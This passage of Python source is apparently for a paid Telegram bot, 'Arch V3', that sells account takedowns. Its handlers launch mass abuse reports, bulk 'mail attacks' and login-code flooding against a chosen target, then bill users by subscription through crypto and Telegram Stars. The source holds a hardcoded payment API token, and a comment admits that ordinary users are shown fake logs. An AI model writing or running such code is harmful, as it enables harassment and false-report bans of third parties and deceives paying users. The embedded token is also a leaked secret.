            c_display = pick_comment(data["reason"], data["method"])
    if is_web:
        unit_name = "\u0437\u0430\u044f\u0432\u043e\u043a"
    elif data["method"] == "mail":
        unit_name = "\u043f\u0438\u0441\u0435\u043c"
    else:
        unit_name = "\u0437\u0430\u043f\u0443\u0441\u043a\u043e\u0432"
    tgt_raw = t["raw"]
    esc_raw = html_mod.escape(tgt_raw)

    # ── BR bot-method gates (method=bot only) ──
    probe_note = ""
    if data["method"] == "bot":
        hit = is_target_whitelisted(tgt_raw)
        if hit:
            await cb.answer("\u26d4 \u0426\u0435\u043b\u044c \u0432 \u0431\u0435\u043b\u043e\u043c \u0441\u043f\u0438\u0441\u043a\u0435!",
                            show_alert=True)
            await push_send_log(
                "\u041f\u043e\u043f\u044b\u0442\u043a\u0430 \u0441\u043d\u0435\u0441\u0442\u0438 \u0446\u0435\u043b\u044c \u0438\u0437 \u0431\u0435\u043b\u043e\u0433\u043e \u0441\u043f\u0438\u0441\u043a\u0430",
                [f"\U0001f3af <code>{esc_raw}</code> (\u043f\u0430\u0442\u0442\u0435\u0440\u043d: <code>{html_mod.escape(hit)}</code>)",
                 f"\U0001f464 {html_mod.escape(cb.from_user.full_name)} (<code>{cb.from_user.id}</code>) | \u043c\u0435\u0442\u043e\u0434: \u0431\u043e\u0442"])
            await state.clear()
            return
        try:
            await cb.message.edit_caption(
                caption=(bq(f"<b>{NAME}</b>  \u00b7  \U0001f916 \u041f\u0440\u043e\u0431\u0430 \u0446\u0435\u043b\u0438")
                         + "\n\n\u23f3 \u041e\u0434\u043d\u0430 \u0441\u0435\u0441\u0441\u0438\u044f \u043f\u0438\u0448\u0435\u0442 \u0431\u043e\u0442\u0443 /start..."),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        pr = await bot_probe_target(tgt_raw)
        if not pr.get("found") and pr.get("error"):
            await cb.answer("\u26a0\ufe0f \u0426\u0435\u043b\u044c \u043d\u0435 \u043e\u0442\u0432\u0435\u0447\u0430\u0435\u0442: "
                            + pr["error"][:120], show_alert=True)
            await state.clear()
            return
        if pr.get("ok"):
            probe_note = ("\n\U0001f916 <b>\u041f\u0440\u043e\u0431\u0430:</b> "
                          + ("\u26a1 \u043a\u0430\u043f\u0447\u0430-\u0431\u043e\u0442 (\u041a\u0414 5 \u043c\u0438\u043d)"
                             if pr.get("captcha") else "\u2705 \u043e\u0442\u0432\u0435\u0447\u0430\u0435\u0442")
                          + (f" | <i>{html_mod.escape(pr.get('preview', '')[:90])}</i>"
                             if pr.get("preview") else ""))
        else:
            probe_note = ("\n\U0001f916 <b>\u041f\u0440\u043e\u0431\u0430:</b> \u26a0\ufe0f "
                          + html_mod.escape(pr.get("error", "\u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d")))
        try:
            await cb.message.edit_caption(
                caption=(bq(f"<b>{NAME}</b>  \u00b7  \U0001f916 \u041f\u0440\u043e\u0431\u0430 \u0446\u0435\u043b\u0438")
                         + "\n\n" + probe_note.lstrip("\n")),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    if data["method"] == "code":
        report_task = asyncio.create_task(code_flood(t["entity"]))
    elif data["method"] == "mail":
        report_task = asyncio.create_task(mail_bulk_send(
            tgt_raw, data["reason"]))
    elif is_web:
        report_task = asyncio.create_task(fire_web_reports(tgt_raw, r["l"], c, data["reason"]))
    else:
        report_task = asyncio.create_task(
            fire_reports(t["entity"], data["reason"], c, t.get("msg_id"), data["method"]))

    # ── loading animation while workers run ──
    is_code = data["method"] == "code"
    act_label = ("\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u043a\u043e\u0434\u043e\u0432 \u0432\u0445\u043e\u0434\u0430..."
                 if is_code else
                 "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u043F\u0438\u0441\u0435\u043C..."
                 if data["method"] == "mail" else
                 "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0436\u0430\u043b\u043e\u0431\u044b...")
    sp_frames = "\u280b\u2819\u2839\u2838\u283c\u2834\u2826\u2827\u2807\u280f"
    started = asyncio.get_event_loop().time()
    i = 0
    while not report_task.done():
        frame = sp_frames[i % len(sp_frames)]
        elapsed = int(asyncio.get_event_loop().time() - started)
        anim = (
            bq(f"<b>{NAME}</b>  \u2014  \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430")
            + "\n\n"
            + f"<b>{frame}</b> {act_label}\n\n"
            + f"\U0001f3af <code>{esc_raw}</code>\n"
            + ("" if is_code else f"\u26a0\ufe0f {r['e']} {r['l']}\n")
            + f"\u23f1 {elapsed}s"
        )
        try:
            await safe_edit(cb.message, anim, parse_mode=ParseMode.HTML,
                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[]))
        except Exception:
            pass
        i += 1
        await asyncio.sleep(1.0)

    try:
        res = await report_task
    except Exception as e:
        log.error("report task crashed: %s", e)
        res = {"ok": 0, "fail": 1, "total": 1,
               "details": [{"name": "worker", "proxy": "-",
                            "ok": False, "err": f"{type(e).__name__}: {e}"}]}
    res.setdefault("details", [])
    ok = res["ok"]
    total = res["total"]
    # ── write log txt ──
    LOGS_DIR.mkdir(exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = LOGS_DIR / f"report_{stamp}.txt"
    dash = "\u2014"
    log_lines = [
        f"Arch V3 \u2014 \u0436\u0443\u0440\u043d\u0430\u043b \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438",
        f"\u0414\u0430\u0442\u0430: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"\u041c\u0435\u0442\u043e\u0434: {m['l']}",
        f"\u0426\u0435\u043b\u044c: {tgt_raw}",
        f"\u041f\u0440\u0438\u0447\u0438\u043d\u0430: {r['l']}",
        f"\u041a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439: {c or dash}",
        f"\u041e\u0442: {cb.from_user.full_name} (id {cb.from_user.id})",
        f"\u0418\u0442\u043e\u0433: {ok}/{total} {unit_name} \u0443\u0441\u043f\u0435\u0448\u043d\u043e",
        "",
        "\u2500\u2500\u2500 \u0434\u0435\u0442\u0430\u043b\u0438 \u2500\u2500\u2500",
    ]
    for d in res["details"]:
        mark = "✅" if d["ok"] else "❌"
        line = f"{mark} {d['name']} | {d['proxy']}"
        if not d["ok"] and d["err"]:
            line += f" | {d['err']}"
        log_lines.append(line)
    if data["method"] in ("code", "mail"):
        log_lines = [ln for ln in log_lines
                     if not (ln.startswith("\u041f\u0440\u0438\u0447\u0438\u043d\u0430:")
                             or ln.startswith("\u041a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439:"))]
    log_path.write_text("\n".join(log_lines), encoding="utf-8")

    # ── final screen ──
    head = ("\u2705 <b>\u041a\u043e\u0434\u044b \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b</b>"
            if is_code else
            "\u2705 <b>\u041f\u0438\u0441\u044C\u043C\u0430 \u043E\u0442\u043F\u0440\u0430\u0432\u043B\u0435\u043D\u044B</b>"
            if data["method"] == "mail" else
            "\u2705 <b>\u0416\u0430\u043b\u043e\u0431\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043B\u0435\u043d\u0430</b>")
    text = (
        bq(f"<b>{NAME}</b>  \u2014  \u0413\u043e\u0442\u043e\u0432\u043e")
        + "\n\n"
        + head + "\n\n"
        + f"\U0001f3af <code>{esc_raw}</code>\n"
        + ("" if is_code else f"\u26a0\ufe0f {r['e']} {r['l']}\n")
        + f"\u26a1 \u0412\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e\n"
        + f"\U0001f552 {ts}"
    )
    try:
        await cb.message.delete()
    except Exception:
        pass
    card = await user_card_path(cb.bot, cb.from_user)
    await cb.message.answer_photo(
        photo=FSInputFile(card),
        caption=text,
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main(cb.from_user.id),
    )

    await cb.message.answer_document(
        document=FSInputFile(log_path),
        caption="\U0001f4c4 \u041b\u043e\u0433 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438",
        reply_markup=kb_main(cb.from_user.id),
    )

    if POOL_CHAT_ID:
        comment_text = c_display if c_display else "\u043d\u0435\u0442"
        me = m["e"]
        ml = m["l"]
        re_ = r["e"]
        rl = r["l"]
        traw = t["raw"]
        uname = cb.from_user.full_name
        uid = cb.from_user.id
        pool_head = ("\u041a\u043e\u0434-\u0444\u043B\u0443\u0434"
                     if is_code else
                     "Mail-\u0430\u0442\u0430\u043A\u0430"
                     if data["method"] == "mail" else
                     "\u041d\u043e\u0432\u0430\u044F \u0436\u0430\u043B\u043E\u0431\u0430")
        pool_text = (
            bq(f"<b>{NAME}</b>  \u2014  {pool_head}")
            + f"\n\n\U0001f464 <b>\u041e\u0442:</b> {uname} (<code>{uid}</code>)"
            + f"\n{me} <b>\u041c\u0435\u0442\u043e\u0434:</b> {ml}"
            + f"\n\U0001f3af <b>\u0426\u0435\u043b\u044c:</b> <code>{traw}</code>"
            + ("" if is_code else
               f"\n\u26a0\ufe0f <b>\u041f\u0440\u0438\u0447\u0438\u043d\u0430:</b> {re_} {rl}"
               + f"\n\U0001f4ac <b>\u041a\u043e\u043c\u043c\u0435\u043d\u0442:</b> {comment_text}")
            + (probe_note.replace("\n", "", 1) if probe_note else "")
            + f"\n\U0001f4e6 {ok}/{total}"
            + f"\n\U0001f552 {ts}"
        )
        try:
            await cb.bot.send_message(int(POOL_CHAT_ID), pool_text, parse_mode=ParseMode.HTML)
        except Exception as e:
            log.warning("pool send failed: %s", e)

    log.info("report: %s | %s | %d/%d", t["raw"], data["reason"], res["ok"], res["total"])
    await state.clear()


# ── subscriptions (xRocket Pay) ─────────────────────────
SUBS_FILE = Path(__file__).parent / "subs.json"
XROCKET_API = "https://pay.api.xrocket.exchange/api/v1"
XROCKET_CURRENCY = "USDT"

SUB_PLANS = {
    "d1":   {"label": "1 \u0434\u0435\u043d\u044c",     "days": 1,   "price": 0.5},
    "d7":   {"label": "7 \u0434\u043d\u0435\u0439",     "days": 7,   "price": 2.0},
    "d30":  {"label": "30 \u0434\u043d\u0435\u0439",    "days": 30,  "price": 6.0},
    "fore": {"label": "\u041d\u0430\u0432\u0441\u0435\u0433\u0434\u0430", "days": None, "price": 12.0},
}

# ── beta payment methods (CryptoBot + Telegram Stars) ────
# PAY_METHODS_ADMIN = <uid> enables pilot mode; None opens everything
PAY_METHODS_ADMIN: int | None = None
CRYPTOBOT_TOKEN = (os.getenv("CRYPTOBOT_TOKEN", "").strip()
                   or "674547:AATgCUnly2uvI6zVZ4Lt6m2X47muj9Crks7")
CRYPTOBOT_API = "https://pay.crypt.bot/api"
# 1 Star ≈ $0.013-0.02 net — plan prices rounded up for margin
STARS_PRICES = {"d1": 50, "d7": 150, "d30": 400, "fore": 800}


async def cryptobot_api(method: str, params: dict | None = None) -> dict:
    """Raw Crypto Pay API call. createInvoice-style params -> POST JSON,
    otherwise GET. Returns the `result` object; raises on api `ok:false`.
    Auth header is `Crypto-Pay-API-Token` (Authorization is REJECTED)."""
    headers = {"Crypto-Pay-API-Token": CRYPTOBOT_TOKEN}
    timeout = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(timeout=timeout) as s:
        if params:
            async with s.post(f"{CRYPTOBOT_API}/{method}", json=params,
                              headers=headers, ssl=False) as r:
                j = await r.json(content_type=None)
        else:
            async with s.get(f"{CRYPTOBOT_API}/{method}", params=params,
                             headers=headers, ssl=False) as r:
                j = await r.json(content_type=None)
    if not j or not j.get("ok"):
        raise RuntimeError(f"cryptobot {method}: {j}")
    return j.get("result") or {}


def load_subs() -> dict:
    # always re-read subs.json so GH Actions checkout picks up fresh changes per-job run
    if SUBS_FILE.exists():
        try:
            return json.loads(SUBS_FILE.read_text(encoding="utf-8"))
        except Exception:
            return {}
    return {}


def save_subs(subs: dict) -> None:
    SUBS_FILE.write_text(json.dumps(subs, ensure_ascii=False, indent=1),
                         encoding="utf-8")
    # grants/payments must survive runner restarts — commit the state back
    commit_file_to_repo("subs.json", "subs update", cooldown=60)
    store.push_async("subs", SUBS_FILE.read_text(encoding="utf-8"))


def user_is_admin(user_id: int) -> bool:
    if bool(ADMIN_ID) and user_id == int(ADMIN_ID):
        return True
    # also recognise both hardcoded forever users as "admins"
    FOREVER = {8813226008, 8661362112, 8901835539}
    return user_id in FOREVER


# ── /setlogs — bind the real-logs destination ────────────
@router.message(F.text.startswith("/setlogs"))
async def cmd_setlogs(msg: Message, state: FSMContext):
    """Admin binds the Logs destination (env LOGS_CHAT_ID wins if preset).
    Works in private chat too: /setlogs -100xxxxxxxxxx  ( обычные логи юзеров
    остаются фейковыми; сюда летит реальная внутренняя телеметрия)."""
    if not (msg.from_user and user_is_admin(msg.from_user.id)):
        return
    arg = (msg.text or "").split(maxsplit=1)
    chat_id = arg[1].strip() if len(arg) > 1 else str(msg.chat.id)
    LOGS_CHAT_FILE.write_text(json.dumps({"chat_id": chat_id}), encoding="utf-8")
    await msg.answer(
        bq(f"<b>{NAME}</b>")
        + f"\n\n✅ Логи отправок теперь летят в: <code>{html_mod.escape(chat_id)}</code>"
        + ("\n<i>(перебит LOGS_CHAT_ID env)</i>" if not (os.getenv("LOGS_CHAT_ID") or "").strip() else ""))


@router.channel_post(F.text.startswith("/setlogs"))
async def cp_setlogs(cp: Message):
    """Write /setlogs inside the Logs channel once — the id sticks for the run."""
    chat_id = str(cp.chat.id)
    LOGS_CHAT_FILE.write_text(json.dumps({"chat_id": chat_id}), encoding="utf-8")
    persist_logs_binding(chat_id)
    await push_send_log("логи привязаны", [f"чат: <code>{chat_id}</code>"])
    log.info("logs channel bound via channel_post: %s", chat_id)


@router.my_chat_member()
async def on_my_chat_member(mcm):
    """Auto-bind: when the bot is made admin in a chat whose title looks like
    'Logs', that chat becomes the real-logs destination — no commands needed."""
    chat = mcm.chat
    if chat.type not in ("channel", "supergroup", "group"):
        return
    status = getattr(mcm.new_chat_member, "status", "")
    if status not in ("administrator", "member"):
        return
    title = (chat.title or "").strip()
    if not re.search(r"log", title, re.I):
        return
    chat_id = str(chat.id)
    LOGS_CHAT_FILE.write_text(json.dumps({"chat_id": chat_id}), encoding="utf-8")
    persist_logs_binding(chat_id)
    try:
        await _BOT.send_message(
            chat_id,
            bq(f"<b>{NAME}</b>") + "\n\n✅ JS взял Logs каналом — сюда летят "
            "реальные логи всех отправок",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass
    log.info("logs channel auto-bound via my_chat_member: %s (%s)", chat_id, title)


def persist_logs_binding(chat_id: str) -> None:
    """Commit logs_chat.json to the repo so the binding survives runner
    restarts (workflow needs permissions: contents: write)."""
    commit_file_to_repo("logs_chat.json", f"bind logs channel {chat_id}")


_last_commit_times: dict[str, float] = {}


def commit_file_to_repo(rel_path: str, msg: str, cooldown: float = 0) -> None:
    """Commit a working-copy file back to the repo so runner restarts keep
    it (bot-refresh.yml grants permissions: contents: write).
    cooldown=<seconds> throttles repeated commits (proxy pool races)."""
    now = time.time()
    if cooldown and now - _last_commit_times.get(rel_path, 0) < cooldown:
        return
    _last_commit_times[rel_path] = now
    def _push():
        base = Path(__file__).parent
        try:
            subprocess.run(["git", "add", rel_path], cwd=base, timeout=30, check=False)
            r = subprocess.run(
                ["git", "-c", "user.name=arch-bot",
                 "-c", "user.email=arch@users.noreply.github.com",
                 "commit", "-m", msg],
                cwd=base, timeout=60, check=False, capture_output=True)
            if r.returncode != 0:
                return   # nothing to commit — file unchanged
            # rebase onto whatever landed since our checkout, then push;
            # a bare push loses the whole state file on any race
            subprocess.run(["git", "pull", "--rebase", "origin", "main"],
                           cwd=base, timeout=90, check=False,
                           capture_output=True)
            p = subprocess.run(["git", "push"], cwd=base, timeout=60,
                               check=False, capture_output=True)
            if p.returncode != 0:
                # remote moved again mid-rebase — one straight retry
                subprocess.run(["git", "pull", "--rebase", "origin", "main"],
                               cwd=base, timeout=90, check=False,
                               capture_output=True)
                p2 = subprocess.run(["git", "push"], cwd=base, timeout=60,
                                    check=False, capture_output=True)
                if p2.returncode != 0:
                    log.warning("commit %s: push rejected after rebase", rel_path)
                    return
            log.info("committed %s to repo", rel_path)
        except Exception as e:
            log.warning("commit %s failed: %s", rel_path, e)
    try:
        loop = asyncio.get_running_loop()
        loop.run_in_executor(None, _push)
    except Exception:
        _push()



# ── user database + referral system ─────────────────────
USERS_FILE = Path(__file__).parent / "users.json"
REF_BONUS = 5          # приглашённых за +1 день подписки
REF_DEEP_BONUS = 1     # бонус за реферала 2-го уровня


def load_users() -> dict:
    if USERS_FILE.exists():
        try:
            return json.loads(USERS_FILE.read_text(encoding="utf-8"))
        except Exception:
            return {}
    return {}


def save_users(users: dict) -> None:
    text = json.dumps(users, ensure_ascii=False, indent=1)
    USERS_FILE.write_text(text, encoding="utf-8")
    # bindings must survive runner restarts — commit the DB back
    commit_file_to_repo("users.json", "users update", cooldown=120)
    store.push_async("users", text)


def touch_user(user) -> dict:
    """Register/update a user in DB; returns the record."""
    users = load_users()
    key = str(user.id)
    rec = users.get(key)
    first = rec is None
    if first:
        rec = {
            "id": user.id,
            "username": user.username or "",
            "name": user.full_name or "",
            "first_seen": datetime.now().isoformat(timespec="seconds"),
            "last_seen": datetime.now().isoformat(timespec="seconds"),
            "ref_by": None,
            "refs": [],
            "ref_grants": 0,
            "deep_refs": 0,
        }
        users[key] = rec
    else:
        rec["last_seen"] = datetime.now().isoformat(timespec="seconds")
        rec["username"] = user.username or rec.get("username", "")
        rec["name"] = user.full_name or rec.get("name", "")
    save_users(users)
    rec["_first"] = first
    return rec


def set_referral(invitee, referrer_id: int) -> str | None:
    """Bind invitee → referrer. Returns 'added'|'self'|'dup'|'loop'."""
    users = load_users()
    inv_key = str(invitee.id)
    ref_key = str(referrer_id)
    if inv_key == ref_key:
        return "self"
    rec = users.get(inv_key)
    if rec is None:
        rec = touch_user(invitee)
        users = load_users()
        rec = users.get(inv_key)
    if rec.get("ref_by"):
        return "dup"
    if rec.get("ref_by") == ref_key:
        return "dup"
    if ref_key in (users.get(inv_key, {}).get("refs") or []):
        return "loop"
    ref_rec = users.get(ref_key)
    if ref_rec is None:
        # referrer may not be in DB yet — create shell record
        users[ref_key] = {
            "id": referrer_id,
            "username": "", "name": "",
            "first_seen": datetime.now().isoformat(timespec="seconds"),
            "last_seen": datetime.now().isoformat(timespec="seconds"),
            "ref_by": None, "refs": [], "ref_grants": 0, "deep_refs": 0,
        }
        ref_rec = users[ref_key]
    # loop-guard: referrer's own chain already contains invitee?
    chain_root = ref_key
    hops = 0
    cur = users.get(chain_root, {})
    while cur and hops < 10:
        by = cur.get("ref_by")
        if by == inv_key:
            return "loop"
        cur = users.get(str(by), {}) if by else {}
        hops += 1
    rec["ref_by"] = referrer_id
    ref_rec.setdefault("refs", []).append(int(invitee.id))
    save_users(users)
    return "added"


def grant_ref_bonus(referrer_id: int, days: int) -> tuple[str, str]:
    """Add `days` to referrer subscription. Returns (state, until_str)."""
    subs = load_subs()
    rec = subs.setdefault(str(referrer_id), {})
    if rec.get("forever"):
        save_subs(subs)
        return "forever", "\u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
    base = rec.get("until", 0)
    start = max(base, time.time())
    rec["until"] = start + days * 86400
    save_subs(subs)
    d = datetime.fromtimestamp(rec["until"]).strftime("%d.%m.%Y %H:%M")
    return "active", d


def count_valid_refs(user_id: int) -> int:
    """Refs that are currently channel-subscribed members."""
    users = load_users()
    rec = users.get(str(user_id), {})
    refs = rec.get("refs", [])
    cid = get_channel_id()
    if not cid:
        return 0
    good = 0
    for rid in refs:
        try:
            m = asyncio.get_event_loop().run_until_complete(
                botRefCtx["bot"].get_chat_member(cid, rid))
            if m.status in ("member", "administrator", "creator"):
                good += 1
        except Exception:
            continue
    return good


botRefCtx: dict = {"bot": None}


# ── required channel gate (restored) ──────────────
def get_channel_id() -> int:
    raw = os.getenv("SUB_CHANNEL_ID", "").strip()
    if raw:
        try:
            return int(raw)
        except ValueError:
            pass
    subs = load_subs()
    v = subs.get("__channel_id")
    try:
        return int(v or 0)
    except (TypeError, ValueError):
        return 0


def set_channel_id(cid: int) -> None:
    subs = load_subs()
    subs["__channel_id"] = cid
    save_subs(subs)


@router.my_chat_member()
async def on_bot_chat_member(cm, ):
    """Auto-save the private channel id once the bot is added there."""
    chat = cm.chat
    if getattr(chat, "type", "") == "channel":
        if get_channel_id() != chat.id:
            set_channel_id(chat.id)
            log.info("sub channel saved: %s (%s)", chat.id, chat.title)
        return


async def channel_gate(cb: CallbackQuery, state: FSMContext) -> bool:
    """Require membership in the private channel before any flow."""
    if user_is_admin(cb.from_user.id):
        return True
    cid = get_channel_id()
    if not cid:
        await cb.answer(
            "\U0001f512 \u041a\u0430\u043d\u0430\u043b \u043d\u0430 \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0435, \u0437\u0430\u0433\u043b\u044f\u043d\u0438 \u043f\u043e\u0437\u0436\u0435",
            show_alert=True)
        return False
    ok = False
    try:
        member = await cb.bot.get_chat_member(cid, cb.from_user.id)
        ok = member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.warning("channel check failed: %s", e)
    if ok:
        return True
    caption = (
        bq(f"<b>{NAME}</b>  \u00b7  \u0434\u043e\u0441\u0442\u0443\u043f")
        + "\n\n\U0001f512 <b>\u0422\u043e\u043b\u044c\u043a\u043e \u0434\u043b\u044f \u043f\u043e\u0434\u043f\u0438\u0441\u0447\u0438\u043a\u043e\u0432 \u043a\u0430\u043d\u0430\u043b\u0430</b>:"
        + "\n\u0432\u0441\u0442\u0443\u043f\u0430\u0439 \u2014 \u0438 \u0436\u043c\u0438 \u043f\u0440\u043e\u0432\u0435\u0440\u0438\u0442\u044c"
    )
    rows = [
        [InlineKeyboardButton(text="\U0001f4dd Вступить в канал", url=SUB_CHANNEL_LINK)],
        [InlineKeyboardButton(text="✅ Я подписался", callback_data="menu:launch")],
    ]
    try:
        await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
                                      reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except Exception:
        pass
    await state.clear()
    await cb.answer()
    return False


async def count_valid_refs_async(user_id: int) -> int:
    """Real channel memberships + manual /refgive credit (never muted)."""
    users = load_users()
    rec = users.get(str(user_id), {})
    refs = rec.get("refs", [])
    credit = rec.get("ref_credit", 0) or 0
    if not refs:
        return credit
    cid = get_channel_id()
    if not cid:
        return credit
    good = 0
    for rid in refs:
        try:
            m = await botRefCtx["bot"].get_chat_member(cid, rid)
            if m.status in ("member", "administrator", "creator"):
                good += 1
        except Exception:
            continue
    return good + credit


def sub_quality(subs: dict, user_id: int) -> tuple[str, str]:
    """(state, until_str). state: admin|forever|active|free|expired"""
    if user_is_admin(user_id):
        return "admin", "\u0431\u0435\u0437 \u043b\u0438\u043c\u0438\u0442\u043e\u0432"
    rec = subs.get(str(user_id), {})
    if rec.get("forever"):
        return "forever", "\u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
    until = rec.get("until", 0)
    if until and until > time.time():
        d = datetime.fromtimestamp(until).strftime("%d.%m.%Y %H:%M")
        return "active", d
    if until:
        return "expired", "\u0438\u0441\u0442\u0435\u043a\u043b\u0430"
    return "free", "\u2014"


async def sub_gate(cb: CallbackQuery, state: FSMContext) -> bool:
    """Call inside menu handlers; returns True to continue flow."""
    subs = load_subs()
    s, until = sub_quality(subs, cb.from_user.id)
    if s in ("admin", "forever", "active"):
        return True
    caption = (
        bq(f"<b>{NAME}</b>  —  Оплата")
        + f"\n\n✏ Состояние: <b>{s}</b>"
        + (f" ({until})" if until != "—" else "")
        + "\n\nДля запуска нужна подписка. Выбери способ оплаты:"
    )
    rows = [
        [InlineKeyboardButton(text="⭐ Telegram Stars", callback_data="sub:pm:xtr")],
        [InlineKeyboardButton(text="💵 CryptoBot (крипта)", callback_data="sub:pm:cbot")],
        [InlineKeyboardButton(text="🚀 xRocket (USDT)", callback_data="sub:pm:xr")],
        [InlineKeyboardButton(text="◀ Назад", callback_data="back:home")],
    ]
    await state.clear()
    try:
        await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
                                      reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    except Exception:
        pass
    await cb.answer()
    return False


def activate_plan(subs: dict, user_id: int, plan_key: str) -> dict:
    pl = SUB_PLANS[plan_key]
    rec = subs.setdefault(str(user_id), {})
    if pl["days"] is None:
        rec["forever"] = True
    else:
        base = rec.get("until", 0)
        start = max(base, time.time())
        rec["until"] = start + pl["days"] * 86400
    save_subs(subs)
    return rec


# ── subscriptions UI ────────────────────────────────────
@router.callback_query(F.data == "sub:shop")
async def sub_shop(cb: CallbackQuery, state: FSMContext):
    subs = load_subs()
    s, until = sub_quality(subs, cb.from_user.id)
    caption = (
        bq(f"<b>{NAME}</b>  —  Оплата")
        + f"\n\n✏ Состояние: <b>{s}</b>"
        + (f" ({until})" if until != "—" else "")
        + "\n\nВыбери способ оплаты:"
    )
    rows = [
        [InlineKeyboardButton(text="⭐ Telegram Stars", callback_data="sub:pm:xtr")],
        [InlineKeyboardButton(text="💵 CryptoBot (крипта)", callback_data="sub:pm:cbot")],
        [InlineKeyboardButton(text="🚀 xRocket (USDT)", callback_data="sub:pm:xr")],
        [InlineKeyboardButton(text="◀ Назад", callback_data="back:home")],
    ]
    await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
                                  reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await cb.answer()


def _pilot_only(cb: CallbackQuery) -> bool:
    """PAY_METHODS_ADMIN=None → методы открыты всем; иначе пилот одного id."""
    return (PAY_METHODS_ADMIN is not None
            and cb.from_user.id != PAY_METHODS_ADMIN)


@router.callback_query(F.data.startswith("sub:pm:"))
async def sub_paymethod(cb: CallbackQuery, state: FSMContext):
    if _pilot_only(cb):
        await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
        return
    m = cb.data.rsplit(":", 1)[1]
    if m == "xtr":
        caption = (
            bq(f"<b>{NAME}</b>  —  ⭐ Telegram Stars")
            + "\n\nНативная оплата звёздами, без внешних сервисов.\nТарифы:"
        )
        for pk, pl in SUB_PLANS.items():
            caption += f"\n• <b>{pl['label']}</b> — <b>{STARS_PRICES[pk]} ⭐</b>"
        rows = [[InlineKeyboardButton(
                    text=f"⭐ {pl['label']} — {STARS_PRICES[pk]}",
                    callback_data=f"sub:buy:xtr:{pk}")]
                for pk, pl in SUB_PLANS.items()]
    elif m == "cbot":
        caption = (
            bq(f"<b>{NAME}</b>  —  💵 CryptoBot")
            + "\n\nИнвойс в USDT через официальный @CryptoBot.\nТарифы:"
        )
        for pk, pl in SUB_PLANS.items():
            caption += f"\n• <b>{pl['label']}</b> — <b>{pl['price']:g} USDT</b>"
        rows = [[InlineKeyboardButton(
                    text=f"💰 {pl['label']} — {pl['price']:g} USDT",
                    callback_data=f"sub:buy:cbot:{pk}")]
                for pk, pl in SUB_PLANS.items()]
    else:
        caption = (
            bq(f"<b>{NAME}</b>  —  🚀 xRocket")
            + "\n\nИнвойс в USDT через @xrocket.\nТарифы:"
        )
        for pk, pl in SUB_PLANS.items():
            caption += f"\n• <b>{pl['label']}</b> — <b>{pl['price']:g} USDT</b>"
        rows = [[InlineKeyboardButton(
                    text=f"💰 {pl['label']} — {pl['price']:g} USDT",
                    callback_data=f"sub:buy:xrocket:{pk}")]
                for pk, pl in SUB_PLANS.items()]
    rows.append([InlineKeyboardButton(text="◀ К способам", callback_data="sub:shop")])
    await cb.message.edit_caption(caption=caption, parse_mode=ParseMode.HTML,
                                  reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
    await cb.answer()


@router.callback_query(F.data.startswith("sub:buy:"))
async def sub_buy(cb: CallbackQuery, state: FSMContext):
    parts = cb.data.split(":")          # sub:buy:<method>:<plan> | sub:buy:<plan>
    pk = parts[-1]
    method = parts[2] if len(parts) == 4 else "xrocket"
    pl = SUB_PLANS.get(pk)
    if not pl:
        await cb.answer("❌", show_alert=True)
        return

    if method == "xtr":
        if _pilot_only(cb):
            await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
            return
        try:
            await cb.bot.send_invoice(
                chat_id=cb.from_user.id,
                title=f"{NAME} — {pl['label']}"[:32],
                description=f"Подписка {pl['label']}: все методы сноса"[:255],
                payload=f"star:{pk}:{cb.from_user.id}",
                currency="XTR",
                provider_token="",   # digital goods/service — no provider
                prices=[LabeledPrice(label=pl["label"][:32],
                                     amount=STARS_PRICES[pk])],
            )
        except Exception as e:
            log.error("stars invoice failed: %s", e)
            await cb.answer(f"❌ Инвойс не создан: {type(e).__name__}", show_alert=True)
            return
        await cb.answer()
        return

    if method == "cbot":
        if _pilot_only(cb):
            await cb.answer("⚠️ Метод ещё на тесте", show_alert=True)
            return
        try:
            me = await cb.bot.get_me()
            invoice = await cryptobot_api("createInvoice", {
                "asset": "USDT",
                "amount": pl["price"],
                "description": f"{NAME} subscription {pl['label']}"[:1024],
                "payload": json.dumps({"kind": "sub", "plan": pk,
                                       "tgId": str(cb.from_user.id)}),
                "expires_in": 3600,
                "paid_btn_name": "callback",
                "paid_btn_url": f"https://t.me/{me.username}",
            })
        except Exception as e:
            log.error("cryptobot invoice failed: %s", e)
            await cb.answer(f"❌ Инвойс не создан: {type(e).__name__}", show_alert=True)
            return
        inv_id = str(invoice.get("invoice_id") or "")
        pay_url = invoice.get("pay_url") or invoice.get("bot_invoice_url") or ""
        if not inv_id or not pay_url:
            log.error("cryptobot bad invoice: %s", invoice)
            await cb.answer("❌ Инвойс не создан", show_alert=True)
            return
        data = await state.get_data()
